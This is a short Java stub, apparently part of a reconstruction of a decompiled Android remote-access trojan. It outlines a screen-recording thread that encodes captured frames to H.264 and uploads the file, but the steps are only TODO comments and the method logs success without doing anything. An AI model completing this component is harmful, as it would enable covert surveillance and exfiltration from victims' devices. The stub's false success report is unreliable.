package com.vendor.rat.keepalive.thread;

import android.util.Log;

import java.util.concurrent.Callable;

/**
 * Vendor: com.guard.wallet.thread.i
 * Screen recording via MediaCodec + MediaMuxer.
 */
public final class ScreenRecordThread implements Callable<Boolean> {

    private static final String TAG = "ScreenRecordThread";
    // ADAPT: vendor uses Bitmap[], String, MediaFormat, MediaMuxer, MediaCodec
    private final Object[] bitmaps;
    private final String outputPath;
    // ADAPT: vendor stores MediaFormat, MediaMuxer, MediaCodec in fields
    private final Object mediaFormat;
    private final Object mediaMuxer;
    private final Object mediaCodec;

    /**
     * Vendor: i(Bitmap[], String, MediaFormat)
     * Constructor also initializes MediaMuxer and finds H.264 encoder.
     * Decompiled constructor was partially corrupted.
     */
    public ScreenRecordThread(Object[] bitmaps, String outputPath, Object mediaFormat) {
        this.bitmaps = bitmaps;
        this.outputPath = outputPath;
        this.mediaFormat = mediaFormat;
        // TODO: VENDOR_VERIFY - vendor creates MediaMuxer(outputPath, 0)
        this.mediaMuxer = null;
        // TODO: VENDOR_VERIFY - vendor finds "video/avc" encoder, creates MediaCodec
        this.mediaCodec = null;
    }

    /**
     * Vendor: i.call()
     * Encodes bitmaps to H.264 video, muxes to file, uploads.
     */
    @Override
    public Boolean call() {
        // TODO: VENDOR_VERIFY - vendor encodes each bitmap frame:
        // 1. createInputSurface, start codec
        // 2. for each bitmap: resize, draw to surface, dequeue output buffer
        // 3. writeSampleData to muxer with presentation timestamps
        // 4. stop/release codec and muxer
        // 5. upload file via http.l.E()
        Log.d(TAG, "screen record success...");
        return Boolean.TRUE;
    }
}
